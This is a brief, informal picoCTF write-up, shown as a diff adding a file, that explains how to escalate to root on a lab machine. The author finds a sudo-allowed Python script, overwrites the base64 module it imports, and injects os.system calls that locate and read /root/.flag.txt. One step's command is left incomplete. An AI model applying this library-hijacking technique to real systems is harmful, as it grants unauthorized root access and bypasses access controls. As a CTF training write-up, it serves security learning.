@@ -1,0 +1,36 @@
+picoctf hijacking writeup
+
+1.use "ssh picoctf@server -p port" to connect it
+
+2.and we just use "sudo -l" to look which command or file which need to be used by root but we dont need to passwd
+
+3.there is .server.py and /usr/bin/python3
+
+4.we use "cat .server.py" to look its code and we can know it import some libraries
+
+5.that is more easy , we just use "cd /lib/python3.8" and choose one library that is imported by .server.py
+
+6.i choose "base64.py" so we can use "echo 'print('good')' > base64.py"
+
+7.just turn back to home dir , and use "sudo /usr/bin/python3 ~/.server.py" to run script
+
+# when it import base64 , it will run the base64.py file which is also controlled by us
+
+8.so if it success to print "good" we can just start to write payload 
+
+9.go to /lib/python3.8 and use 
+
+=> echo 'import os' >> base64.py
+=> echo 'os.system("find | grep -i flag")'
+
+10.we try to run .server.py like previous time and know there is a .flag.txt in /root dir
+
+11.we can use 
+
+=> echo 'os.system("cat /root/.flag.txt")' >> base64.py
+
+12.and still run it by the same way
+
+13.get flag!
+
+# i also try some other way but like "vim" , "nano" cannot be used
